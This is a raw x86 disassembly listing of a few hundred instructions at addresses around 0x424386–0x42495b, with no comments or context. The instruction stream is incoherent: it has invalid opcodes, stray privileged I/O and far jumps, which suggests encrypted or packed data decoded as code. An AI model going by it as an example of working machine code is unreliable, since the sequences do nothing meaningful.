  424386:	2b d1                	sub    %ecx,%edx
  424388:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  424389:	bd 1d aa 96 96       	mov    $0x9696aa1d,%ebp
  42438e:	0f 83 88 6f 01 5c    	jae    0x5c43b31c
  424394:	7a 48                	jp     0x4243de
  424396:	f3 34 6c             	repz xor $0x6c,%al
  424399:	21 e5                	and    %esp,%ebp
  42439b:	0d 5e fa d7 e6       	or     $0xe6d7fa5e,%eax
  4243a0:	50                   	push   %eax
  4243a1:	d3 c9                	ror    %cl,%ecx
  4243a3:	bf 42 ac bb 98       	mov    $0x98bbac42,%edi
  4243a8:	34 85                	xor    $0x85,%al
  4243aa:	ad                   	lods   %ds:(%esi),%eax
  4243ab:	71 26                	jno    0x4243d3
  4243ad:	5e                   	pop    %esi
  4243ae:	9f                   	lahf
  4243af:	4a                   	dec    %edx
  4243b0:	18 37                	sbb    %dh,(%edi)
  4243b2:	91                   	xchg   %eax,%ecx
  4243b3:	23 0a                	and    (%edx),%ecx
  4243b5:	10 83 fc fc e8 75    	adc    %al,0x75e8fcfc(%ebx)
  4243bb:	d5 ee                	aad    $0xee
  4243bd:	c1 67 ae e0          	shll   $0xe0,-0x52(%edi)
  4243c1:	9a 59 87 d2 73 4b 60 	lcall  $0x604b,$0x73d28759
  4243c8:	c4 4c 3d 39          	les    0x39(%ebp,%edi,1),%ecx
  4243cc:	b6 25                	mov    $0x25,%dh
  4243ce:	2f                   	das
  4243cf:	12 a8 fe 21 eb 9a    	adc    -0x6514de02(%eax),%ch
  4243d5:	d7                   	xlat   %ds:(%ebx)
  4243d6:	13 c4                	adc    %esp,%eax
  4243d8:	8c b0 05 9d 7e 89    	mov    %?,-0x768162fb(%eax)
  4243de:	f7 75 70             	divl   0x70(%ebp)
  4243e1:	62 e9 4e             	(bad) {%k2}
  4243e4:	62 3b                	bound  %edi,(%ebx)
  4243e6:	db 27                	(bad) (%edi)
  4243e8:	54                   	push   %esp
  4243e9:	14 cd                	adc    $0xcd,%al
  4243eb:	00 46 ed             	add    %al,-0x13(%esi)
  4243ee:	bf d9 38 c6 b1       	mov    $0xb1c638d9,%edi
  4243f3:	b2 2a                	mov    $0x2a,%dl
  4243f5:	9f                   	lahf
  4243f6:	a3 8b 1c 78 95       	mov    %eax,0x95781c8b
  4243fb:	64 0e                	fs push %cs
  4243fd:	51                   	push   %ecx
  4243fe:	87 3d 00 2a 79 16    	xchg   %edi,0x16792a00
  424404:	f2 02 6b ef          	repnz add -0x11(%ebx),%ch
  424408:	e4 db                	in     $0xdb,%al
  42440a:	5d                   	pop    %ebp
  42440b:	c8 d6 b4 4f          	enter  $0xb4d6,$0x4f
  42440f:	a1 c8 8d 41 7a       	mov    0x7a418dc8,%eax
  424414:	ba 66 33 53 ac       	mov    $0xac533366,%edx
  424419:	3f                   	aas
  42441a:	25 2c 9e 18 17       	and    $0x17189e2c,%eax
  42441f:	05 90 f1 09 de       	add    $0xde09f190,%eax
  424424:	82 ca fb             	or     $0xfb,%dl
  424427:	b6 74                	mov    $0x74,%dh
  424429:	a3 ed 8f 66 7c       	mov    %eax,0x7c668fed
  42442e:	df 68 58             	fildll 0x58(%eax)
  424431:	55                   	push   %ebp
  424432:	d1 41 4a             	roll   $1,0x4a(%ecx)
  424435:	2e c3                	cs ret
  424437:	1a 3c 07             	sbb    (%edi,%eax,1),%bh
  42443a:	b5 f3                	mov    $0xf3,%ch
  42443c:	2e e0 a7             	loopne,pn 0x4243e6
  42443f:	cc                   	int3
  424440:	20 b9 99 a5 12 92    	and    %bh,-0x6ded5a67(%ecx)
  424446:	8b 7e 04             	mov    0x4(%esi),%edi
  424449:	6b 7d 57 f6          	imul   $0xfffffff6,0x57(%ebp),%edi
  42444d:	43                   	inc    %ebx
  42444e:	6f                   	outsl  %ds:(%esi),(%dx)
  42444f:	30 e8                	xor    %ch,%al
  424451:	1c 61                	sbb    $0x61,%al
  424453:	09 da                	or     %ebx,%edx
  424455:	f5                   	cmc
  424456:	53                   	push   %ebx
  424457:	e2 cc                	loop   0x424425
  424459:	ce                   	into
  42445a:	45                   	inc    %ebp
  42445b:	bb be a7 37 94       	mov    $0x9437a7be,%ebx
  424460:	b0 80                	mov    $0x80,%al
  424462:	29 6d a2             	sub    %ebp,-0x5e(%ebp)
  424465:	59                   	pop    %ecx
  424466:	1b 46 94             	sbb    -0x6c(%esi),%eax
  424469:	32 0d 1f 86 0b ff    	xor    0xff0b861f,%cl
  42446f:	f7 78 e4             	idivl  -0x1c(%eax)
  424472:	f1                   	int1
  424473:	d0 6a bd             	shrb   $1,-0x43(%edx)
  424476:	e3 a9                	jecxz  0x424421
  424478:	5c                   	pop    %esp
  424479:	96                   	xchg   %eax,%esi
  42447a:	d5 82                	aad    $0x82
  42447c:	4e                   	dec    %esi
  42447d:	6f                   	outsl  %ds:(%esi),(%dx)
  42447e:	c7                   	(bad)
  42447f:	5b                   	pop    %ebx
  424480:	40                   	inc    %eax
  424481:	48                   	dec    %eax
  424482:	b9 34 32 21 ab       	mov    $0xab213234,%ecx
  424487:	0d 24 fa 9d e6       	or     $0xe69dfa24,%eax
  42448c:	16                   	push   %ss
  42448d:	d3 8f bf 08 ac 81    	rorl   %cl,-0x7e53f741(%edi)
  424493:	98                   	cwtl
  424494:	fa                   	cli
  424495:	84 73 71             	test   %dh,0x71(%ebx)
  424498:	ec                   	in     (%dx),%al
  424499:	5d                   	pop    %ebp
  42449a:	65 4a                	gs dec %edx
  42449c:	de 36                	fidivs (%esi)
  42449e:	57                   	push   %edi
  42449f:	23 d0                	and    %eax,%edx
  4244a1:	0f 49 fc             	cmovns %esp,%edi
  4244a4:	c2 e8 3b             	ret    $0x3be8
  4244a7:	d5 b4                	aad    $0xb4
  4244a9:	c1 2d ae a6 9a 1f 87 	shrl   $0x87,0x1f9aa6ae
  4244b0:	98                   	cwtl
  4244b1:	73 11                	jae    0x4244c4
  4244b3:	60                   	pusha
  4244b4:	8a 4c 03 39          	mov    0x39(%ebx,%eax,1),%cl
  4244b8:	7c 25                	jl     0x4244df
  4244ba:	f5                   	cmc
  4244bb:	11 6e fe             	adc    %ebp,-0x2(%esi)
  4244be:	e7 ea                	out    %eax,$0xea
  4244c0:	60                   	pusha
  4244c1:	d7                   	xlat   %ds:(%ebx)
  4244c2:	d9 c3                	fld    %st(3)
  4244c4:	52                   	push   %edx
  4244c5:	b0 cb                	mov    $0xcb,%al
  4244c7:	9c                   	pushf
  4244c8:	44                   	inc    %esp
  4244c9:	89 bd 75 36 62 af    	mov    %edi,-0x509dc98b(%ebp)
  4244cf:	4e                   	dec    %esi
  4244d0:	28 3b                	sub    %bh,(%ebx)
  4244d2:	a1 27 1a 14 93       	mov    0x93141a27,%eax
  4244d7:	00 0c ed 85 d9 fe c5 	add    %cl,-0x3a01267b(,%ebp,8)
  4244de:	77 b2                	ja     0x424492
  4244e0:	f0 9e                	lock sahf
  4244e2:	69 8b e2 77 5b 64 d4 	imul   $0x3d4d50d4,0x645b77e2(%ebx),%ecx
  4244e9:	50 4d 3d 
  4244ec:	c6                   	(bad)
  4244ed:	29 3f                	sub    %edi,(%edi)
  4244ef:	16                   	push   %ss
  4244f0:	b8 02 31 ef aa       	mov    $0xaaef3102,%eax
  4244f5:	db 23                	(bad) (%ebx)
  4244f7:	c8 9c b4 15          	enter  $0xb49c,$0x15
  4244fb:	a1 8e 8d 07 7a       	mov    0x7a078d8e,%eax
  424500:	80 66 f9 52          	andb   $0x52,-0x7(%esi)
  424504:	72 3f                	jb     0x424545
  424506:	eb 2b                	jmp    0x424533
  424508:	64 18 dd             	fs sbb %bl,%ch
  42450b:	04 56                	add    $0x56,%al
  42450d:	f1                   	int1
  42450e:	cf                   	iret
  42450f:	dd 48 ca             	fisttpll -0x36(%eax)
  424512:	c1 b6 3a a3 b3 8f 2c 	shll   $0x2c,-0x704c5cc6(%esi)
  424519:	7c a5                	jl     0x4244c0
  42451b:	68 1e 55 97 41       	push   $0x4197551e
  424520:	10 2e                	adc    %ch,(%esi)
  424522:	89 1a                	mov    %ebx,(%edx)
  424524:	02 07                	add    (%edi),%al
  424526:	7b f3                	jnp    0x42451b
  424528:	f4                   	hlt
  424529:	df 6d cc             	fildll -0x34(%ebp)
  42452c:	e6 b8                	out    %al,$0xb8
  42452e:	5f                   	pop    %edi
  42452f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  424530:	d8 91 51 7e ca 6a    	fcoms  0x6aca7e51(%ecx)
  424536:	43                   	inc    %ebx
  424537:	57                   	push   %edi
  424538:	bc 43 35 30 ae       	mov    $0xae303543,%esp
  42453d:	1c 27                	sbb    $0x27,%al
  42453f:	09 a0 f5 19 e2 92    	or     %esp,-0x6d1de60b(%eax)
  424545:	ce                   	into
  424546:	0b bb 84 a7 fd 93    	or     -0x6c02587c(%ebx),%edi
  42454c:	76 80                	jbe    0x4244ce
  42454e:	ef                   	out    %eax,(%dx)
  42454f:	6c                   	insb   (%dx),%es:(%edi)
  424550:	68 59 e1 45 5a       	push   $0x5a45e159
  424555:	32 d3                	xor    %bl,%dl
  424557:	1e                   	push   %ds
  424558:	4c                   	dec    %esp
  424559:	0b c5                	or     %ebp,%eax
  42455b:	f7 3e                	idivl  (%esi)
  42455d:	e4 b7                	in     $0xb7,%al
  42455f:	d0 30                	shlb   $1,(%eax)
  424561:	bd a9 a9 22 96       	mov    $0x9622a9a9,%ebp
  424566:	9b                   	fwait
  424567:	82 14 6f 8d          	adcb   $0x8d,(%edi,%ebp,2)
  42456b:	5b                   	pop    %ebx
  42456c:	06                   	push   %es
  42456d:	48                   	dec    %eax
  42456e:	7f 34                	jg     0x4245a4
  424570:	f8                   	clc
  424571:	20 71 0d             	and    %dh,0xd(%ecx)
  424574:	ea f9 63 e6 dc d2 55 	ljmp   $0x55d2,$0xdce663f9
  42457b:	bf ce ab 47 98       	mov    $0x9847abce,%edi
  424580:	c0 84 39 71 b2 5d 2b 	rolb   $0x4a,0x2b5db271(%ecx,%edi,1)
  424587:	4a 
  424588:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  424589:	36 1d 23 96 0f 0f    	ss sbb $0xf0f9623,%eax
  42458f:	fc                   	cld
  424590:	88 e8                	mov    %ch,%al
  424592:	01 d5                	add    %edx,%ebp
  424594:	7a c1                	jp     0x424557
  424596:	f3 ad                	rep lods %ds:(%esi),%eax
  424598:	6c                   	insb   (%dx),%es:(%edi)
  424599:	9a e5 86 5e 73 d7 5f 	lcall  $0x5fd7,$0x735e86e5
  4245a0:	50                   	push   %eax
  4245a1:	4c                   	dec    %esp
  4245a2:	c9                   	leave
  4245a3:	38 42 25             	cmp    %al,0x25(%edx)
  4245a6:	bb 11 34 fe ad       	mov    $0xadfe3411,%ebx
  4245ab:	ea 26 d7 9f c3 18 b0 	ljmp   $0xb018,$0xc39fd726
  4245b2:	91                   	xchg   %eax,%ecx
  4245b3:	9c                   	pushf
  4245b4:	0a 89 83 75 fc 61    	or     0x61fc7583(%ecx),%cl
  4245ba:	75 4e                	jne    0x42460a
  4245bc:	ee                   	out    %al,(%dx)
  4245bd:	3a 67 27             	cmp    0x27(%edi),%ah
  4245c0:	e0 13                	loopne 0x4245d5
  4245c2:	59                   	pop    %ecx
  4245c3:	00 d2                	add    %dl,%dl
  4245c5:	ec                   	in     (%dx),%al
  4245c6:	4b                   	dec    %ebx
  4245c7:	d9 c4                	fld    %st(4)
  4245c9:	c5 3d b2 b6 9e 2f    	lds    0x2f9eb6b2,%edi
  4245cf:	8b a8 77 21 64 9a    	mov    -0x659bde89(%eax),%ebp
  4245d5:	50                   	push   %eax
  4245d6:	13 3d 8c 29 05 16    	adc    0x1605298c,%edi
  4245dc:	7e 02                	jle    0x4245e0
  4245de:	f7 ee                	imul   %esi
  4245e0:	70 db                	jo     0x4245bd
  4245e2:	e9 c7 62 b4 db       	jmp    0xdbf6a8ae
  4245e7:	a0 54 8d cd 79       	mov    0x79cd8d54,%al
  4245ec:	46                   	inc    %esi
  4245ed:	66 bf 52 38          	mov    $0x3852,%di
  4245f1:	3f                   	aas
  4245f2:	b1 2b                	mov    $0x2b,%cl
  4245f4:	2a 18                	sub    (%eax),%bl
  4245f6:	a3 04 1c f1 95       	mov    %eax,0x95f11c04
  4245fb:	dd 0e                	fisttpll (%esi)
  4245fd:	ca 87 b6             	lret   $0xb687
  424600:	00 a3 79 8f f2 7b    	add    %ah,0x7bf28f79(%ebx)
  424606:	6b 68 e4 54          	imul   $0x54,-0x1c(%eax),%ebp
  42460a:	5d                   	pop    %ebp
  42460b:	41                   	inc    %ecx
  42460c:	d6                   	salc
  42460d:	2d 4f 1a c8 06       	sub    $0x6c81a4f,%eax
  424612:	41                   	inc    %ecx
  424613:	f3 ba df 33 cc ac    	repz mov $0xaccc33df,%edx
  424619:	b8 25 a5 9e 91       	mov    $0x919ea525,%eax
  42461e:	17                   	pop    %ss
  42461f:	7e 90                	jle    0x4245b1
  424621:	6a 09                	push   $0x9
  424623:	57                   	push   %edi
  424624:	82 43 fb 2f          	addb   $0x2f,-0x5(%ebx)
  424628:	74 1c                	je     0x424646
  42462a:	ed                   	in     (%dx),%eax
  42462b:	08 66 f5             	or     %ah,-0xb(%esi)
  42462e:	df e1                	(bad)
  424630:	58                   	pop    %eax
  424631:	ce                   	into
  424632:	d1 ba 4a a7 c3 93    	sarl   $1,-0x6c3c58b6(%edx)
  424638:	3c 80                	cmp    $0x80,%al
  42463a:	b5 6c                	mov    $0x6c,%ch
  42463c:	2e 59                	cs pop %ecx
  42463e:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  42463f:	45                   	inc    %ebp
  424640:	20 32                	and    %dh,(%edx)
  424642:	99                   	cltd
  424643:	1e                   	push   %ds
  424644:	12 0b                	adc    (%ebx),%cl
  424646:	8b f7                	mov    %edi,%esi
  424648:	04 e4                	add    $0xe4,%al
  42464a:	7d d0                	jge    0x42461c
  42464c:	f6 bc 6f a9 e8 95 61 	idivb  0x6195e8a9(%edi,%ebp,2)
  424653:	82 da 6e             	sbb    $0x6e,%dl
  424656:	53                   	push   %ebx
  424657:	5b                   	pop    %ebx
  424658:	cc                   	int3
  424659:	47                   	inc    %edi
  42465a:	45                   	inc    %ebp
  42465b:	34 be                	xor    $0xbe,%al
  42465d:	20 37                	and    %dh,(%edi)
  42465f:	0d b0 f9 29 e6       	or     $0xe629f9b0,%eax
  424664:	a2 d2 1b bf 94       	mov    %al,0x94bf1bd2
  424669:	ab                   	stos   %eax,%es:(%edi)
  42466a:	0d 98 86 84 ff       	or     $0xff848698,%eax
  42466f:	70 78                	jo     0x4246e9
  424671:	5d                   	pop    %ebp
  424672:	f1                   	int1
  424673:	49                   	dec    %ecx
  424674:	6a 36                	push   $0x36
  424676:	e3 22                	jecxz  0x42469a
  424678:	5c                   	pop    %esp
  424679:	0f d5 fb             	pmullw %mm3,%mm7
  42467c:	4e                   	dec    %esi
  42467d:	e8 c7 d4 40 c1       	call   0xc1831b49
  424682:	b9 ad 32 9a ab       	mov    $0xab9a32ad,%ecx
  424687:	86 24 73             	xchg   %ah,(%ebx,%esi,2)
  42468a:	9d                   	popf
  42468b:	5f                   	pop    %edi
  42468c:	16                   	push   %ss
  42468d:	4c                   	dec    %esp
  42468e:	8f                   	(bad)
  42468f:	38 08                	cmp    %cl,(%eax)
  424691:	25 81 11 fa fd       	and    $0xfdfa1181,%eax
  424696:	73 ea                	jae    0x424682
  424698:	ec                   	in     (%dx),%al
  424699:	d6                   	salc
  42469a:	65 c3                	gs ret
  42469c:	de af 57 9c d0 88    	fisubrs -0x772f63a9(%edi)
  4246a2:	49                   	dec    %ecx
  4246a3:	75 c2                	jne    0x424667
  4246a5:	61                   	popa
  4246a6:	3b 4e b4             	cmp    -0x4c(%esi),%ecx
  4246a9:	3a 2d 27 a6 13 1f    	cmp    0x1f13a627,%ch
  4246af:	00 98 ec 11 d9 8a    	add    %bl,-0x7526ee14(%eax)
  4246b5:	c5 03                	lds    (%ebx),%eax
  4246b7:	b2 7c                	mov    $0x7c,%dl
  4246b9:	9e                   	sahf
  4246ba:	f5                   	cmc
  4246bb:	8a 6e 77             	mov    0x77(%esi),%ch
  4246be:	e7 63                	out    %eax,$0x63
  4246c0:	60                   	pusha
  4246c1:	50                   	push   %eax
  4246c2:	d9 3c 52             	fnstcw (%edx,%edx,2)
  4246c5:	29 cb                	sub    %ecx,%ebx
  4246c7:	15 44 02 bd ee       	adc    $0xeebd0244,%eax
  4246cc:	36 db af c7 28 b4 a1 	fldt   %ss:-0x5e4bd739(%edi)
  4246d3:	a0 1a 8d 93 79       	mov    0x79938d1a,%al
  4246d8:	0c 66                	or     $0x66,%al
  4246da:	85 52 fe             	test   %edx,-0x2(%edx)
  4246dd:	3e 77 2b             	ja,pt  0x42470b
  4246e0:	f0 17                	lock pop %ss
  4246e2:	69 04 e2 f0 5b dd d4 	imul   $0xd4dd5bf0,(%edx,%eiz,8),%eax
  4246e9:	c9                   	leave
  4246ea:	4d                   	dec    %ebp
  4246eb:	b6 c6                	mov    $0xc6,%dh
  4246ed:	a2 3f 8f b8 7b       	mov    %al,0x7bb88f3f
  4246f2:	31 68 aa             	xor    %ebp,-0x56(%eax)
  4246f5:	54                   	push   %esp
  4246f6:	23 41 9c             	and    -0x64(%ecx),%eax
  4246f9:	2d 15 1a 8e 06       	sub    $0x68e1a15,%eax
  4246fe:	07                   	pop    %es
  4246ff:	f3 80 df f9          	repz sbb $0xf9,%bh
  424703:	cb                   	lret
  424704:	72 b8                	jb     0x4246be
  424706:	eb a4                	jmp    0x4246ac
  424708:	64 91                	fs xchg %eax,%ecx
  42470a:	dd 7d 56             	fnstsw 0x56(%ebp)
  42470d:	6a cf                	push   $0xffffffcf
  42470f:	56                   	push   %esi
  424710:	48                   	dec    %eax
  424711:	43                   	inc    %ebx
  424712:	c1 2f 3a             	shrl   $0x3a,(%edi)
  424715:	1c b3                	sbb    $0xb3,%al
  424717:	08 2c f5 a5 e1 1e ce 	or     %ch,-0x31e11e5b(,%esi,8)
  42471e:	97                   	xchg   %eax,%edi
  42471f:	ba 10 a7 89 93       	mov    $0x9389a710,%edx
  424724:	02 80 7b 6c f4 58    	add    0x58f46c7b(%eax),%al
  42472a:	6d                   	insl   (%dx),%es:(%edi)
  42472b:	45                   	inc    %ebp
  42472c:	e6 31                	out    %al,$0x31
  42472e:	5f                   	pop    %edi
  42472f:	1e                   	push   %ds
  424730:	d8 0a                	fmuls  (%edx)
  424732:	51                   	push   %ecx
  424733:	f7 ca e3 43 d0 bc    	test   $0xbcd043e3,%edx
  424739:	bc 35 a9 ae 95       	mov    $0x95aea935,%esp
  42473e:	27                   	daa
  42473f:	82 a0 6e 19 5b 92 47 	andb   $0x47,-0x6da4e692(%eax)
  424746:	0b 34 84             	or     (%esp,%eax,4),%esi
  424749:	20 fd                	and    %bh,%ch
  42474b:	0c 76                	or     $0x76,%al
  42474d:	f9                   	stc
  42474e:	ef                   	out    %eax,(%dx)
  42474f:	e5 68                	in     $0x68,%eax
  424751:	d2 e1                	shl    %cl,%cl
  424753:	be 5a ab d3 97       	mov    $0x97d3ab5a,%esi
  424758:	4c                   	dec    %esp
  424759:	84 c5                	test   %al,%ch
  42475b:	70 3e                	jo     0x42479b
  42475d:	5d                   	pop    %ebp
  42475e:	b7 49                	mov    $0x49,%bh
  424760:	30 36                	xor    %dh,(%esi)
  424762:	a9 22 22 0f 9b       	test   $0x9b0f2222,%eax
  424767:	fb                   	sti
  424768:	14 e8                	adc    $0xe8,%al
  42476a:	8d                   	lea    (bad),%edx
  42476b:	d4 06                	aam    $0x6
  42476d:	c1 7f ad f8          	sarl   $0xf8,-0x53(%edi)
  424771:	99                   	cltd
  424772:	71 86                	jno    0x4246fa
  424774:	ea 72 63 5f dc 4b 55 	ljmp   $0x554b,$0xdc5f6372
  42477b:	38 ce                	cmp    %cl,%dh
  42477d:	24 47                	and    $0x47,%al
  42477f:	11 c0                	adc    %eax,%eax
  424781:	fd                   	std
  424782:	39 ea                	cmp    %ebp,%edx
  424784:	b2 d6                	mov    $0xd6,%dl
  424786:	2b c3                	sub    %ebx,%eax
  424788:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  424789:	af                   	scas   %es:(%edi),%eax
  42478a:	1d 9c 96 88 0f       	sbb    $0xf88969c,%eax
  42478f:	75 88                	jne    0x424719
  424791:	61                   	popa
  424792:	01 4e 7a             	add    %ecx,0x7a(%esi)
  424795:	3a f3                	cmp    %bl,%dh
  424797:	26 6c                	es insb (%dx),%es:(%edi)
  424799:	13 e5                	adc    %ebp,%esp
  42479b:	ff 5e ec             	lcall  *-0x14(%esi)
  42479e:	d7                   	xlat   %ds:(%ebx)
  42479f:	d8 50 c5             	fcoms  -0x3b(%eax)
  4247a2:	c9                   	leave
  4247a3:	b1 42                	mov    $0x42,%cl
  4247a5:	9e                   	sahf
  4247a6:	bb 8a 34 77 ad       	mov    $0xad77348a,%ebx
  4247ab:	63 26                	arpl   %esp,(%esi)
  4247ad:	50                   	push   %eax
  4247ae:	9f                   	lahf
  4247af:	3c 18                	cmp    $0x18,%al
  4247b1:	29 91 15 0a 02 83    	sub    %edx,-0x7cfdf5eb(%ecx)
  4247b7:	ee                   	out    %al,(%dx)
  4247b8:	fc                   	cld
  4247b9:	da 75 c7             	fidivl -0x39(%ebp)
  4247bc:	ee                   	out    %al,(%dx)
  4247bd:	b3 67                	mov    $0x67,%bl
  4247bf:	a0 e0 8c 59 79       	mov    0x79598ce0,%al
  4247c4:	d2 65 4b             	shlb   %cl,0x4b(%ebp)
  4247c7:	52                   	push   %edx
  4247c8:	c4 3e                	les    (%esi),%edi
  4247ca:	3d 2b b6 17 2f       	cmp    $0x2f17b62b,%eax
  4247cf:	04 a8                	add    $0xa8,%al
  4247d1:	f0 21 dd             	lock and %ebx,%ebp
  4247d4:	9a c9 13 b6 8c a2 05 	lcall  $0x5a2,$0x8cb613c9
  4247db:	8f                   	(bad)
  4247dc:	7e 7b                	jle    0x424859
  4247de:	f7 67 70             	mull   0x70(%edi)
  4247e1:	54                   	push   %esp
  4247e2:	e9 40 62 2d db       	jmp    0xdb6faa27
  4247e7:	19 54 06 cd          	sbb    %edx,-0x33(%esi,%eax,1)
  4247eb:	f2 46                	repnz inc %esi
  4247ed:	df bf cb 38 b8 b1    	fistpll -0x4e47c735(%edi)
  4247f3:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4247f4:	2a 91 a3 7d 1c 6a    	sub    0x6a1c7da3(%ecx),%dl
  4247fa:	95                   	xchg   %eax,%ebp
  4247fb:	56                   	push   %esi
  4247fc:	0e                   	push   %cs
  4247fd:	43                   	inc    %ebx
  4247fe:	87 2f                	xchg   %ebp,(%edi)
  424800:	00 1c 79             	add    %bl,(%ecx,%edi,2)
  424803:	08 f2                	or     %dh,%dl
  424805:	f4                   	hlt
  424806:	6b e1 e4             	imul   $0xffffffe4,%ecx,%esp
  424809:	cd 5d                	int    $0x5d
  42480b:	ba d6 a6 4f 93       	mov    $0x934fa6d6,%edx
  424810:	c8 7f 41 6c          	enter  $0x417f,$0x6c
  424814:	ba 58 33 45 ac       	mov    $0xac453358,%edx
  424819:	31 25 1e 9e 0a 17    	xor    %esp,0x170a9e1e
  42481f:	f7 90 e3 09 d0 82    	notl   -0x7d2ff61d(%eax)
  424825:	bc fb a8 74 95       	mov    $0x9574a8fb,%esp
  42482a:	ed                   	in     (%dx),%eax
  42482b:	81 66 6e df 5a 58 47 	andl   $0x47585adf,0x6e(%esi)
  424832:	d1 33                	shll   $1,(%ebx)
  424834:	4a                   	dec    %edx
  424835:	20 c3                	and    %al,%bl
  424837:	0c 3c                	or     $0x3c,%al
  424839:	f9                   	stc
  42483a:	b5 e5                	mov    $0xe5,%ch
  42483c:	2e d2 a7 be 20 ab 99 	shlb   %cl,%cs:-0x6654df42(%edi)
  424843:	97                   	xchg   %eax,%edi
  424844:	12 84 8b 70 04 5d 7d 	adc    0x7d5d0470(%ebx,%ecx,4),%al
  42484b:	49                   	dec    %ecx
  42484c:	f6 35 6f 22 e8 0e    	divb   0xee8226f
  424852:	61                   	popa
  424853:	fb                   	sti
  424854:	da e7                	(bad)
  424856:	53                   	push   %ebx
  424857:	d4 cc                	aam    $0xcc
  424859:	c0 45 ad be          	rolb   $0xbe,-0x53(%ebp)
  42485d:	99                   	cltd
  42485e:	37                   	aaa
  42485f:	86 b0 72 29 5f a2    	xchg   %dh,-0x5da0d68e(%eax)
  424865:	4b                   	dec    %ebx
  424866:	1b 38                	sbb    (%eax),%edi
  424868:	94                   	xchg   %eax,%esp
  424869:	24 0d                	and    $0xd,%al
  42486b:	11 86 fd ff e9 78    	adc    %eax,0x78e9fffd(%esi)
  424871:	d6                   	salc
  424872:	f1                   	int1
  424873:	c2 6a af             	ret    $0xaf6a
  424876:	e3 9b                	jecxz  0x424813
  424878:	5c                   	pop    %esp
  424879:	88 d5                	mov    %dl,%ch
  42487b:	74 4e                	je     0x4248cb
  42487d:	61                   	popa
  42487e:	c7                   	(bad)
  42487f:	4d                   	dec    %ebp
  424880:	40                   	inc    %eax
  424881:	3a b9 26 32 13 ab    	cmp    -0x54eccdda(%ecx),%bh
  424887:	ff 24 ec             	jmp    *(%esp,%ebp,8)
  42488a:	9d                   	popf
  42488b:	d8 16                	fcoms  (%esi)
  42488d:	c5 8f b1 08 9e 81    	lds    -0x7e61f74f(%edi),%ecx
  424893:	8a fa                	mov    %dl,%bh
  424895:	76 73                	jbe    0x42490a
  424897:	63 ec                	arpl   %ebp,%esp
  424899:	4f                   	dec    %edi
  42489a:	65 3c de             	gs cmp $0xde,%al
  42489d:	28 57 15             	sub    %dl,0x15(%edi)
  4248a0:	d0 01                	rolb   $1,(%ecx)
  4248a2:	49                   	dec    %ecx
  4248a3:	ee                   	out    %al,(%dx)
  4248a4:	c2 da 3b             	ret    $0x3bda
  4248a7:	c7                   	(bad)
  4248a8:	b4 b3                	mov    $0xb3,%ah
  4248aa:	2d a0 a6 8c 1f       	sub    $0x1f8ca6a0,%eax
  4248af:	79 98                	jns    0x424849
  4248b1:	65 11 52 8a          	adc    %edx,%gs:-0x76(%edx)
  4248b5:	3e 03 2b             	add    %ds:(%ebx),%ebp
  4248b8:	7c 17                	jl     0x4248d1
  4248ba:	f5                   	cmc
  4248bb:	03 6e f0             	add    -0x10(%esi),%ebp
  4248be:	e7 dc                	out    %eax,$0xdc
  4248c0:	60                   	pusha
  4248c1:	c9                   	leave
  4248c2:	d9 b5 52 a2 cb 8e    	fnstenv -0x71345dae(%ebp)
  4248c8:	44                   	inc    %esp
  4248c9:	7b bd                	jnp    0x424888
  4248cb:	67 36 54             	addr16 ss push %esp
  4248ce:	af                   	scas   %es:(%edi),%eax
  4248cf:	40                   	inc    %eax
  4248d0:	28 2d a1 19 1a 06    	sub    %ch,0x61a19a1
  4248d6:	93                   	xchg   %eax,%ebx
  4248d7:	f2 0c df             	repnz or $0xdf,%al
  4248da:	85 cb                	test   %ecx,%ebx
  4248dc:	fe                   	(bad)
  4248dd:	b7 77                	mov    $0x77,%bh
  4248df:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4248e0:	f0 90                	lock nop
  4248e2:	69 7d e2 69 5b 56 d4 	imul   $0xd4565b69,-0x1e(%ebp),%edi
  4248e9:	42                   	inc    %edx
  4248ea:	4d                   	dec    %ebp
  4248eb:	2f                   	das
  4248ec:	c6                   	(bad)
  4248ed:	1b 3f                	sbb    (%edi),%edi
  4248ef:	08 b8 f4 31 e1 aa    	or     %bh,-0x551ece0c(%eax)
  4248f5:	cd 23                	int    $0x23
  4248f7:	ba 9c a6 15 93       	mov    $0x9315a69c,%edx
  4248fc:	8e 7f 07             	mov    0x7(%edi),%?
  4248ff:	6c                   	insb   (%dx),%es:(%edi)
  424900:	80 58 f9 44          	sbbb   $0x44,-0x7(%eax)
  424904:	72 31                	jb     0x424937
  424906:	eb 1d                	jmp    0x424925
  424908:	64 0a dd             	fs or  %ch,%bl
  42490b:	f6 56 e3             	notb   -0x1d(%esi)
  42490e:	cf                   	iret
  42490f:	cf                   	iret
  424910:	48                   	dec    %eax
  424911:	bc c1 a8 3a 95       	mov    $0x953aa8c1,%esp
  424916:	b3 81                	mov    $0x81,%bl
  424918:	2c 6e                	sub    $0x6e,%al
  42491a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  42491b:	5a                   	pop    %edx
  42491c:	1e                   	push   %ds
  42491d:	47                   	inc    %edi
  42491e:	97                   	xchg   %eax,%edi
  42491f:	33 10                	xor    (%eax),%edx
  424921:	20 89 0c 02 f9 7b    	and    %cl,0x7bf9020c(%ecx)
  424927:	e5 f4                	in     $0xf4,%eax
  424929:	d1 6d be             	shrl   $1,-0x42(%ebp)
  42492c:	e6 aa                	out    %al,$0xaa
  42492e:	5f                   	pop    %edi
  42492f:	97                   	xchg   %eax,%edi
  424930:	d8 83 51 70 ca 5c    	fadds  0x5cca7051(%ebx)
  424936:	43                   	inc    %ebx
  424937:	49                   	dec    %ecx
  424938:	bc 35 35 22 ae       	mov    $0xae223535,%esp
  42493d:	0e                   	push   %cs
  42493e:	27                   	daa
  42493f:	fb                   	sti
  424940:	a0 e7 19 d4 92       	mov    0x92d419e7,%al
  424945:	c0 0b ad             	rorb   $0xad,(%ebx)
  424948:	84 99 fd 85 76 72    	test   %bl,0x727685fd(%ecx)
  42494e:	ef                   	out    %eax,(%dx)
  42494f:	5e                   	pop    %esi
  424950:	68 4b e1 37 5a       	push   $0x5a37e14b
  424955:	24 d3                	and    $0xd3,%al
  424957:	10 4c fd c5          	adc    %cl,-0x3b(%ebp,%edi,8)
  42495b:	e9 3e d6 b7 c2       	jmp    0xc2fa1f9e
